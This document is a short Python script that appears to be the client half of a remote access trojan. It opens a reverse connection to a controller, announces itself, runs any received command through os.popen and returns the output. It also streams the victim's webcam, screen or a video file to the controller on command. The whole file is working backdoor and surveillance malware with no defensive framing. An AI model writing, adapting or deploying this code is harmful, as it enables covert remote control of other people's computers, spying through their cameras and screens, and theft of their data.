import subprocess
import socket
import os

from vidstream import VideoClient, CameraClient, ScreenShareClient

HOST = '127.0.0.1'  # Standard loopback interface address (localhost)
PORT = 65433  

HOST = '127.0.0.1'  # The server's hostname or IP address
PORT = 65433

def connection():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        soc.connect((HOST, PORT))
        soc.send('im alive'.encode('utf-8'))
        cmd_on = False
        while True:
            try:
                data = soc.recv(2048).decode('utf-8')
                if data == 'exit':
                    return
                elif data == 'cmdon':
                    cmd_on = True
                elif data == 'cmdoff':
                    cmd_on = False
                elif cmd_on:
                    if data.split(' ')[0] == 'cd':
                        os.chdir(data.split(' ')[1])
                    else:
                        if data == 'start video':
                            client1 = VideoClient(HOST, 9999, 'video.mp4')
                            client1.start_stream()
                            continue

                        if data == 'stop video':
                            client1.stop_stream()
                            continue

                        if data == 'start camera':
                            client2 = CameraClient(HOST, 9999)
                            client2.start_stream()

                        if data == 'stop camera':
                            client2.stop_stream()
                            continue

                        if data == 'start ss':
                            client3 = ScreenShareClient(HOST, 9999)
                            client3.start_stream()

                        if data == 'stop ss':
                            client3.stop_stream()
                            data = 'screen sharing stoped'

                        data = os.popen(data).read()
                        print(data)
                        if data != '':
                            soc.sendall(data.encode('utf-8'))
                        else:
                            soc.send('err'.encode('utf-8'))
                        continue
                else:
                    pass
                    # print(data)
                    
                soc.send('ok'.encode('utf-8'))
            except:
                soc.send('err'.encode('utf-8'))
                continue

if __name__ == "__main__":
    connection()

